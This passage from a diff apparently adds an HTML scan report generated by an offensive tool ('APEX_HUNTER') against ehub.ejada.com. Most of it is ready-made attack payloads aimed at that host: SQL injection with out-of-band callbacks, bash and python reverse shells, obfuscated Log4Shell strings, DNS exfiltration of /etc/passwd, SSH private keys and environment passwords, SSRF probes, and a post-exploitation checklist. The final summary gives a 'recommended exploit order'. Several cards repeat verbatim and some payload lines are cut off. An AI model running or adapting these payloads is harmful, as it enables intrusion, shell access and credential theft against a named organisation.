+    <b>Evidence:</b><pre><code></code></pre>
+    <b>PoC (curl):</b><pre><code># MySQL:
+curl -sk &#x27;https://ehub.ejada.com/api?id=&#x27; AND LOAD_FILE(CONCAT(&#x27;\\\\&#x27;,version(),&#x27;.YOUR_COLLABORATOR\\a&#x27;))-- -&#x27;
+# MySQL:
+curl -sk &#x27;https://ehub.ejada.com/api?user=&#x27; AND LOAD_FILE(CONCAT(&#x27;\\\\&#x27;,version(),&#x27;.YOUR_COLLABORATOR\\a&#x27;))-- -&#x27;
+# MySQL:
+curl -sk &#x27;https://ehub.ejada.com/api?username=&#x27; AND LOAD_FILE(CONCAT(&#x27;\\\\&#x27;,version(),&#x27;.YOUR_COLLABORATOR\\a&#x27;))-- -&#x27;
+# MSSQL:
+curl -sk &#x27;https://ehub.ejada.com/api?id=&#x27;; EXEC master..xp_dirtree &#x27;\\YOUR_COLLABORATOR\a&#x27;-- -&#x27;
+# MSSQL:
+curl -sk &#x27;https://ehub.ejada.com/api?user=&#x27;; EXEC master..xp_dirtree &#x27;\\YOUR_COLLABORATOR\a&#x27;-- -&#x27;
+# MSSQL:
+curl -sk &#x27;https://ehub.ejada.com/api?username=&#x27;; EXEC master..xp_dirtree &#x27;\\YOUR_COLLABORATOR\a&#x27;-- -&#x27;</code></pre>
+    <div class="fix">Fix: Use parameterised queries. Restrict DB user privileges to prevent file/network operations. Block outbound DNS from DB servers.</div>
+  </div>
+</div>
+<div class="card" data-sev="INFO">
+  <div class="card-hdr" style="border-left:4px solid #6c757d">
+    <span class="badge" style="background:#6c757d">INFO</span>
+    <b>RCE-VRF-001</b> — RCE Verification — OOB DNS Callback Payloads Generated
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-78 &nbsp;|&nbsp; CVSS: 0.0 &nbsp;|&nbsp; RCE</div>
+    <p>Generated 6 OOB DNS-callback RCE verification payloads for ehub.ejada.com. Replace YOUR_OOB_DOMAIN with your Burp Collaborator / interactsh domain and inject into any confirmed command injection, SSTI, or deserialization point to verify OOB execution.</p>
+    <b>Evidence:</b><pre><code>  [bash] bash+-c+&#x27;bash+-i+&gt;%26+/dev/tcp/YOUR_OOB_DOMAIN.burpcollaborator.net/443+0&gt;%261&#x27;
+  [curl] curl+http://rce.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/$(id)
+  [wget] wget+http://rce.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/$(whoami)
+  [python] python3+-c+&#x27;import+socket,subprocess,os;s=socket.socket();s.connect((&quot;YOUR_OOB_DOMAIN.burpcollaborator.net&quot;,443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])&#x27;
+  [nslookup] ns</code></pre>
+    <b>PoC (curl):</b><pre><code># Inject into confirmed injection point:
+curl -sk &#x27;https://ehub.ejada.com/api/cmd?cmd=curl+http://rce.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/$(id)&#x27;</code></pre>
+    <div class="fix">Fix: Use interactsh (https://app.interactsh.com) or Burp Collaborator to detect DNS callbacks. Each shell variant targets a different interpreter; monitor all.</div>
+  </div>
+</div>
+<div class="card" data-sev="INFO">
+  <div class="card-hdr" style="border-left:4px solid #6c757d">
+    <span class="badge" style="background:#6c757d">INFO</span>
+    <b>POST-EXPLOIT-MAP-001</b> — Post-Exploitation Path Map — Authorized Testing Playbook
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-693 &nbsp;|&nbsp; CVSS: 0.0 &nbsp;|&nbsp; Post-Exploitation Analysis</div>
+    <p>Post-exploitation paths identified based on confirmed findings. For authorized penetration testing only — document evidence, stop at proof-of-concept, report to client/program.</p>
+    <b>Evidence:</b><pre><code>
+[RCE Post-Exploitation]
+  → cat /etc/passwd &amp;&amp; cat /etc/shadow (privilege check)
+  → find / -perm -4000 -type f 2&gt;/dev/null (SUID binaries)
+  → sudo -l (sudo permissions)
+  → cat ~/.ssh/id_rsa (SSH private keys)
+  → env | grep -i &#x27;secret\|key\|pass\|token&#x27; (env secrets)
+  → cat /proc/net/fib_trie (internal network ranges)
+  → arp -a &amp;&amp; ip route (network topology)
+  → ps aux &amp;&amp; netstat -tlnp (running services)
+  → find / -name &#x27;*.conf&#x27; -o -name &#x27;*.cfg&#x27; 2&gt;/dev/null | head -20
+  → curl http://169.</code></pre>
+    <b>PoC (curl):</b><pre><code># Execute only within authorized scope with written permission</code></pre>
+    <div class="fix">Fix: Each post-exploitation path represents a concrete attack vector. Address findings in order of CVSS score. Implement network segmentation, EDR, and SIEM to detect post-exploitation activity.</div>
+  </div>
+</div>
+<div class="card" data-sev="INFO">
+  <div class="card-hdr" style="border-left:4px solid #6c757d">
+    <span class="badge" style="background:#6c757d">INFO</span>
+    <b>LOG4SHELL2-OOB-PAYLOADS</b> — Log4Shell Follow-On — All OOB Probe Payloads Generated
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-917 &nbsp;|&nbsp; CVSS: 0.0 &nbsp;|&nbsp; Log4Shell / Java RCE</div>
+    <p>Generated 10 Log4Shell bypass payloads for 15 injection headers. Replace YOUR_OOB_DOMAIN with interactsh/Collaborator domain. Monitor for DNS callbacks confirming JNDI lookup execution.</p>
+    <b>Evidence:</b><pre><code>  [1] ${jndi:ldap://basic.__HOST__.__OOB__/a}
+  [2] ${${lower:j}ndi:${lower:l}dap://cve45046.__HOST__.__OOB__/a}
+  [3] ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://obfs.__HOST__.__OO
+  [4] ${${upper:j}ndi:${upper:l}dap://upper.__HOST__.__OOB__/a}
+  [5] ${jndi:rmi://rmi.__HOST__.__OOB__/a}
+  [6] ${jndi:iiop://iiop.__HOST__.__OOB__/a}
+  [7] ${jndi:dns://dns.__HOST__.__OOB__/a}
+  [8] ${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//nested.__HOST__.__
+  [9] ${env:HOSTNA</code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sk &#x27;https://ehub.ejada.com/&#x27; -H &#x27;X-Api-Version: ${jndi:ldap://basic.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/a}&#x27;
+curl -sk &#x27;https://ehub.ejada.com/&#x27; -H &#x27;X-Forwarded-For: ${jndi:ldap://basic.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/a}&#x27;
+curl -sk &#x27;https://ehub.ejada.com/&#x27; -H &#x27;User-Agent: ${jndi:ldap://basic.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/a}&#x27;
+curl -sk &#x27;https://ehub.ejada.com/&#x27; -H &#x27;Referer: ${jndi:ldap://basic.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/a}&#x27;</code></pre>
+    <div class="fix">Fix: See CVE-2021-44228 mitigations. Monitor all injection points with interactsh. Use JNDI allow-list to block outbound LDAP/RMI/IIOP.</div>
+  </div>
+</div>
+<div class="card" data-sev="INFO">
+  <div class="card-hdr" style="border-left:4px solid #6c757d">
+    <span class="badge" style="background:#6c757d">INFO</span>
+    <b>DNS-EXFIL-CAPACITY-001</b> — DNS Exfiltration — Channel Analysis &amp; Payload Library
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-200 &nbsp;|&nbsp; CVSS: 0.0 &nbsp;|&nbsp; DNS Exfiltration</div>
+    <p>DNS exfiltration channel capacity: ~189 chars/query via 3-label subdomain. Generated 6 OOB DNS exfil payloads. Use interactsh with DNS listener to capture exfiltrated data.</p>
+    <b>Evidence:</b><pre><code>  [1] $($(cat /etc/passwd | base64 | tr -d &#x27;\n&#x27; | cut -c1-50)).exfil.ehub.ejada.com.YO
+  [2] $($(id | base64)).exfil.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net
+  [3] $($(hostname | base64)).exfil.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.ne
+  [4] $($(whoami | base64)).exfil.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net
+  [5] $($(env | grep -i pass | base64 | head -c 50)).exfil.ehub.ejada.com.YOUR_OOB_DOM
+  [6] $($(cat ~/.ssh/id_rsa | base64 | cut -c1-50)).exfil.ehub.ejada.co</code></pre>
+    <b>PoC (curl):</b><pre><code># DNS exfil via curl:
+curl -sk &#x27;https://ehub.ejada.com/?host=$(id|base64).ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net&#x27;
+# Listen with interactsh:
+interactsh-client -server interactsh.com -n 1</code></pre>
+    <div class="fix">Fix: Monitor DNS queries for anomalous subdomain patterns. Implement Response Policy Zones (RPZ). Apply DNS-over-HTTPS with filtering. Block outbound UDP 53 from application servers.</div>
+  </div>
+</div>
+<div class="card" data-sev="INFO">
+  <div class="card-hdr" style="border-left:4px solid #6c757d">
+    <span class="badge" style="background:#6c757d">INFO</span>
+    <b>LOG4SHELL2-OOB-PAYLOADS</b> — Log4Shell Follow-On — All OOB Probe Payloads Generated
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-917 &nbsp;|&nbsp; CVSS: 0.0 &nbsp;|&nbsp; Log4Shell / Java RCE</div>
+    <p>Generated 10 Log4Shell bypass payloads for 15 injection headers. Replace YOUR_OOB_DOMAIN with interactsh/Collaborator domain. Monitor for DNS callbacks confirming JNDI lookup execution.</p>
+    <b>Evidence:</b><pre><code>  [1] ${jndi:ldap://basic.__HOST__.__OOB__/a}
+  [2] ${${lower:j}ndi:${lower:l}dap://cve45046.__HOST__.__OOB__/a}
+  [3] ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://obfs.__HOST__.__OO
+  [4] ${${upper:j}ndi:${upper:l}dap://upper.__HOST__.__OOB__/a}
+  [5] ${jndi:rmi://rmi.__HOST__.__OOB__/a}
+  [6] ${jndi:iiop://iiop.__HOST__.__OOB__/a}
+  [7] ${jndi:dns://dns.__HOST__.__OOB__/a}
+  [8] ${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//nested.__HOST__.__
+  [9] ${env:HOSTNA</code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sk &#x27;https://ehub.ejada.com/&#x27; -H &#x27;X-Api-Version: ${jndi:ldap://basic.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/a}&#x27;
+curl -sk &#x27;https://ehub.ejada.com/&#x27; -H &#x27;X-Forwarded-For: ${jndi:ldap://basic.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/a}&#x27;
+curl -sk &#x27;https://ehub.ejada.com/&#x27; -H &#x27;User-Agent: ${jndi:ldap://basic.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/a}&#x27;
+curl -sk &#x27;https://ehub.ejada.com/&#x27; -H &#x27;Referer: ${jndi:ldap://basic.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/a}&#x27;</code></pre>
+    <div class="fix">Fix: See CVE-2021-44228 mitigations. Monitor all injection points with interactsh. Use JNDI allow-list to block outbound LDAP/RMI/IIOP.</div>
+  </div>
+</div>
+<div class="card" data-sev="INFO">
+  <div class="card-hdr" style="border-left:4px solid #6c757d">
+    <span class="badge" style="background:#6c757d">INFO</span>
+    <b>DNS-EXFIL-CAPACITY-001</b> — DNS Exfiltration — Channel Analysis &amp; Payload Library
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-200 &nbsp;|&nbsp; CVSS: 0.0 &nbsp;|&nbsp; DNS Exfiltration</div>
+    <p>DNS exfiltration channel capacity: ~189 chars/query via 3-label subdomain. Generated 6 OOB DNS exfil payloads. Use interactsh with DNS listener to capture exfiltrated data.</p>
+    <b>Evidence:</b><pre><code>  [1] $($(cat /etc/passwd | base64 | tr -d &#x27;\n&#x27; | cut -c1-50)).exfil.ehub.ejada.com.YO
+  [2] $($(id | base64)).exfil.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net
+  [3] $($(hostname | base64)).exfil.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.ne
+  [4] $($(whoami | base64)).exfil.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net
+  [5] $($(env | grep -i pass | base64 | head -c 50)).exfil.ehub.ejada.com.YOUR_OOB_DOM
+  [6] $($(cat ~/.ssh/id_rsa | base64 | cut -c1-50)).exfil.ehub.ejada.co</code></pre>
+    <b>PoC (curl):</b><pre><code># DNS exfil via curl:
+curl -sk &#x27;https://ehub.ejada.com/?host=$(id|base64).ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net&#x27;
+# Listen with interactsh:
+interactsh-client -server interactsh.com -n 1</code></pre>
+    <div class="fix">Fix: Monitor DNS queries for anomalous subdomain patterns. Implement Response Policy Zones (RPZ). Apply DNS-over-HTTPS with filtering. Block outbound UDP 53 from application servers.</div>
+  </div>
+</div>
+<div class="card" data-sev="INFO">
+  <div class="card-hdr" style="border-left:4px solid #6c757d">
+    <span class="badge" style="background:#6c757d">INFO</span>
+    <b>LOG4SHELL2-OOB-PAYLOADS</b> — Log4Shell Follow-On — All OOB Probe Payloads Generated
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-917 &nbsp;|&nbsp; CVSS: 0.0 &nbsp;|&nbsp; Log4Shell / Java RCE</div>
+    <p>Generated 10 Log4Shell bypass payloads for 15 injection headers. Replace YOUR_OOB_DOMAIN with interactsh/Collaborator domain. Monitor for DNS callbacks confirming JNDI lookup execution.</p>
+    <b>Evidence:</b><pre><code>  [1] ${jndi:ldap://basic.__HOST__.__OOB__/a}
+  [2] ${${lower:j}ndi:${lower:l}dap://cve45046.__HOST__.__OOB__/a}
+  [3] ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://obfs.__HOST__.__OO
+  [4] ${${upper:j}ndi:${upper:l}dap://upper.__HOST__.__OOB__/a}
+  [5] ${jndi:rmi://rmi.__HOST__.__OOB__/a}
+  [6] ${jndi:iiop://iiop.__HOST__.__OOB__/a}
+  [7] ${jndi:dns://dns.__HOST__.__OOB__/a}
+  [8] ${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//nested.__HOST__.__
+  [9] ${env:HOSTNA</code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sk &#x27;https://ehub.ejada.com/&#x27; -H &#x27;X-Api-Version: ${jndi:ldap://basic.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/a}&#x27;
+curl -sk &#x27;https://ehub.ejada.com/&#x27; -H &#x27;X-Forwarded-For: ${jndi:ldap://basic.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/a}&#x27;
+curl -sk &#x27;https://ehub.ejada.com/&#x27; -H &#x27;User-Agent: ${jndi:ldap://basic.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/a}&#x27;
+curl -sk &#x27;https://ehub.ejada.com/&#x27; -H &#x27;Referer: ${jndi:ldap://basic.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/a}&#x27;</code></pre>
+    <div class="fix">Fix: See CVE-2021-44228 mitigations. Monitor all injection points with interactsh. Use JNDI allow-list to block outbound LDAP/RMI/IIOP.</div>
+  </div>
+</div>
+<div class="card" data-sev="INFO">
+  <div class="card-hdr" style="border-left:4px solid #6c757d">
+    <span class="badge" style="background:#6c757d">INFO</span>
+    <b>SSRF-ADV-OOB-URL</b> — SSRF Advanced OOB Payload — ?url
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-918 &nbsp;|&nbsp; CVSS: 0.0 &nbsp;|&nbsp; SSRF</div>
+    <p>OOB SSRF test payload for parameter &#x27;url&#x27;. Replace OOB domain.</p>
+    <b>Evidence:</b><pre><code>  [file://] file%3A///etc/passwd
+  [gopher://] gopher%3A//127.0.0.1%3A6379/_INFO%250A
+  [dict://] dict%3A//127.0.0.1%3A6379/info
+  [ldap://] ldap%3A//127.0.0.1%3A389/
+  [sftp://] sftp%3A//127.0.0.1%3A22/
+  [tftp://] tftp%3A//127.0.0.1%3A69/test</code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sk &#x27;https://ehub.ejada.com/?url=http%3A//url.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/&#x27;</code></pre>
+    <div class="fix">Fix: Monitor DNS callbacks for all OOB probes.</div>
+  </div>
+</div>
+<div class="card" data-sev="INFO">
+  <div class="card-hdr" style="border-left:4px solid #6c757d">
+    <span class="badge" style="background:#6c757d">INFO</span>
+    <b>SSRF-ADV-OOB-URL</b> — SSRF Advanced OOB Payload — ?url
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-918 &nbsp;|&nbsp; CVSS: 0.0 &nbsp;|&nbsp; SSRF</div>
+    <p>OOB SSRF test payload for parameter &#x27;url&#x27;. Replace OOB domain.</p>
+    <b>Evidence:</b><pre><code>  [file://] file%3A///etc/passwd
+  [gopher://] gopher%3A//127.0.0.1%3A6379/_INFO%250A
+  [dict://] dict%3A//127.0.0.1%3A6379/info
+  [ldap://] ldap%3A//127.0.0.1%3A389/
+  [sftp://] sftp%3A//127.0.0.1%3A22/
+  [tftp://] tftp%3A//127.0.0.1%3A69/test</code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sk &#x27;https://ehub.ejada.com/?url=http%3A//url.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/&#x27;</code></pre>
+    <div class="fix">Fix: Monitor DNS callbacks for all OOB probes.</div>
+  </div>
+</div>
+<div class="card" data-sev="INFO">
+  <div class="card-hdr" style="border-left:4px solid #6c757d">
+    <span class="badge" style="background:#6c757d">INFO</span>
+    <b>SSRF-ADV-OOB-URL</b> — SSRF Advanced OOB Payload — ?url
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-918 &nbsp;|&nbsp; CVSS: 0.0 &nbsp;|&nbsp; SSRF</div>
+    <p>OOB SSRF test payload for parameter &#x27;url&#x27;. Replace OOB domain.</p>
+    <b>Evidence:</b><pre><code>  [file://] file%3A///etc/passwd
+  [gopher://] gopher%3A//127.0.0.1%3A6379/_INFO%250A
+  [dict://] dict%3A//127.0.0.1%3A6379/info
+  [ldap://] ldap%3A//127.0.0.1%3A389/
+  [sftp://] sftp%3A//127.0.0.1%3A22/
+  [tftp://] tftp%3A//127.0.0.1%3A69/test</code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sk &#x27;https://ehub.ejada.com/?url=http%3A//url.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/&#x27;</code></pre>
+    <div class="fix">Fix: Monitor DNS callbacks for all OOB probes.</div>
+  </div>
+</div>
+<div class="card" data-sev="INFO">
+  <div class="card-hdr" style="border-left:4px solid #6c757d">
+    <span class="badge" style="background:#6c757d">INFO</span>
+    <b>SSRF-ADV-OOB-URL</b> — SSRF Advanced OOB Payload — ?url
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-918 &nbsp;|&nbsp; CVSS: 0.0 &nbsp;|&nbsp; SSRF</div>
+    <p>OOB SSRF test payload for parameter &#x27;url&#x27;. Replace OOB domain.</p>
+    <b>Evidence:</b><pre><code>  [file://] file%3A///etc/passwd
+  [gopher://] gopher%3A//127.0.0.1%3A6379/_INFO%250A
+  [dict://] dict%3A//127.0.0.1%3A6379/info
+  [ldap://] ldap%3A//127.0.0.1%3A389/
+  [sftp://] sftp%3A//127.0.0.1%3A22/
+  [tftp://] tftp%3A//127.0.0.1%3A69/test</code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sk &#x27;https://ehub.ejada.com/?url=http%3A//url.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/&#x27;</code></pre>
+    <div class="fix">Fix: Monitor DNS callbacks for all OOB probes.</div>
+  </div>
+</div>
+<div class="card" data-sev="INFO">
+  <div class="card-hdr" style="border-left:4px solid #6c757d">
+    <span class="badge" style="background:#6c757d">INFO</span>
+    <b>RECON-SUBDOMAIN-BRUTE-001</b> — Subdomain Brute — 1 new subdomains discovered
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-200 &nbsp;|&nbsp; CVSS: 0.0 &nbsp;|&nbsp; Reconnaissance</div>
+    <p>DNS brute-force discovered 1 additional subdomains for ejada.com. Each represents additional attack surface.</p>
+    <b>Evidence:</b><pre><code>  vpn.ejada.com → 88.85.230.136</code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sk &#x27;https://vpn.ejada.com/&#x27;</code></pre>
+    <div class="fix">Fix: Review each discovered subdomain for security posture. Remove unused subdomains. Apply consistent security headers and authentication across all subdomains.</div>
+  </div>
+</div>
+<div class="card" data-sev="INFO">
+  <div class="card-hdr" style="border-left:4px solid #6c757d">
+    <span class="badge" style="background:#6c757d">INFO</span>
+    <b>FINAL-CHAIN-REPORT-001</b> — Final Attack Chain Report — 21C / 31H / 41M
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-693 &nbsp;|&nbsp; CVSS: 0.0 &nbsp;|&nbsp; Report</div>
+    <p>═══ APEX_HUNTER FINAL REPORT — ehub.ejada.com ═══
+Scan date    : 2026-06-01 02:23
+Total findings: 112
+Risk breakdown: CRITICAL=21 | HIGH=31 | MEDIUM=41 | LOW=0 | INFO=19
+
+TOP CRITICAL FINDINGS:
+  [FULL-CHAIN-POC] Full chain PoC — 5 findings chained, 2 attack combos identified (CVSS 10.0)
+    PoC: curl -sI &#x27;https://ehub.ejada.com/&#x27;
+curl -sI &#x27;https://ehub.ejada.com/&#x27; | grep -i 
+  [ADV-EXPLOIT-CHAIN] Advanced exploit chain: SSRF → Cloud Metadata → IAM Key Exfiltration → Full AWS Takeover (CVSS 10.0)
+    PoC: Step 1: curl -sI &#x27;https://ehub.ejada.com/&#x27;
+curl -sI &#x27;https://ehub.ejada.com/&#x27; | 
+  [AZURE-IMDS-V1-METADATA-URL] SSRF → Azure IMDS v1-metadata Chain via ?url (CVSS 9.9)
+    PoC: # Step 1 — Verify SSRF via OOB:
+curl -sk &#x27;https://ehub.ejada.com?url=http://YOUR
+  [AZURE-IMDS-V1-IDENTITY-URL] SSRF → Azure IMDS v1-identity Chain via ?url (CVSS 9.9)
+    PoC: # Step 1 — Verify SSRF via OOB:
+curl -sk &#x27;https://ehub.ejada.com?url=http://YOUR
+  [AZURE-IMDS-V1-SUBSCRIPTIO-URL] SSRF → Azure IMDS v1-subscription Chain via ?url (CVSS 9.9)
+    PoC: # Step 1 — Verify SSRF via OOB:
+curl -sk &#x27;https://ehub.ejada.com?url=http://YOUR
+  [AZURE-IMDS-V2-IDENTITY-URL] SSRF → Azure IMDS v2-identity Chain via ?url (CVSS 9.9)
+    PoC: # Step 1 — Verify SSRF via OOB:
+curl -sk &#x27;https://ehub.ejada.com?url=http://YOUR
+  [AWS-IMDS-V1-CREDS] SSRF → AWS IMDS v1-creds — IAM Credential Theft Chain (CVSS 9.9)
+    PoC: # IMDSv1 (no token required):
+curl -sk &#x27;https://ehub.ejada.com?url=http%3A//169.
+  [AWS-IMDS-V1-ROLE] SSRF → AWS IMDS v1-role — IAM Credential Theft Chain (CVSS 9.9)
+    PoC: # IMDSv1 (no token required):
+curl -sk &#x27;https://ehub.ejada.com?url=http%3A//169.
+
+TOP HIGH FINDINGS:
+  [F-HDR-001] Critical Security Headers Missing (CVSS 5.4)
+  [CHAIN-JENKINS-RCE] [EXPLOIT CHAIN] Jenkins Groovy RCE → Lateral Movement (CVSS 10.0)
+  [CHAIN-LFI-RCE] [EXPLOIT CHAIN] LFI → Log Poison → RCE (CVSS 9.8)
+  [CHAIN-AUTH-BYPASS-ADMIN] [EXPLOIT CHAIN] Auth Bypass → Admin Takeover → Data Exfil (CVSS 9.6)
+  [CHAIN-SUPPLY-CHAIN-SAST] [EXPLOIT CHAIN] Supply Chain → Internal Package Confusion → RCE (CVSS 9.3)
+
+ATTACK CATEGORIES:
+  Information Disclosure                    26 finding(s)
+  Auth / Credential Stuffing                22 finding(s)
+  SSRF → Cloud Pivot                        11 finding(s)
+  SSRF                                       7 finding(s)
+  Subdomain Takeover                         7 finding(s)
+  Exploit Chain                              7 finding(s)
+  GraphQL                                    4 finding(s)
+  Lateral Movement                           4 finding(s)
+  Rate Limiting                              4 finding(s)
+  Risk Scorecard                             3 finding(s)
+
+RECOMMENDED EXPLOIT ORDER:
+  1. All CRITICAL findings — immediate RCE/takeover risk
+  2. Injection chains (SQLi→dump, CMDi→shell, SSTI→RCE)
+  3. Cloud pivot chains (SSRF→IMDS→IAM creds)
+  4. Authentication bypasses (JWT, BFLA, session fixation)
+  5. Sensitive file exposure (env, keys, configs)
+
+REMEDIATION PRIORITY:
+  P1 (24h): All CRITICAL — active exploitation risk
+  P2 (7d):  All HIGH — significant security impact
+  P3 (30d): All MEDIUM — defence in depth
+  P4 (90d): All LOW/INFO — hardening</p>
+    <b>Evidence:</b><pre><code>Total: 112 findings across 23 categories</code></pre>
+    <b>PoC (curl):</b><pre><code># See individual finding PoC commands in JSON/HTML report</code></pre>
+    <div class="fix">Fix: Remediate all CRITICAL and HIGH findings before next assessment cycle.</div>
+  </div>
+</div></div>
+</div>
+<script>
+function filter(s){
+  document.querySelectorAll('.btn').forEach(b=>b.classList.remove('active'));
+  event.target.classList.add('active');
+  document.querySelectorAll('.card').forEach(c=>{
+    c.style.display=(s==='ALL'||c.dataset.sev===s)?'':'none';
+  });
+}
+document.querySelector('.btn').classList.add('active');
+</script></body></html>
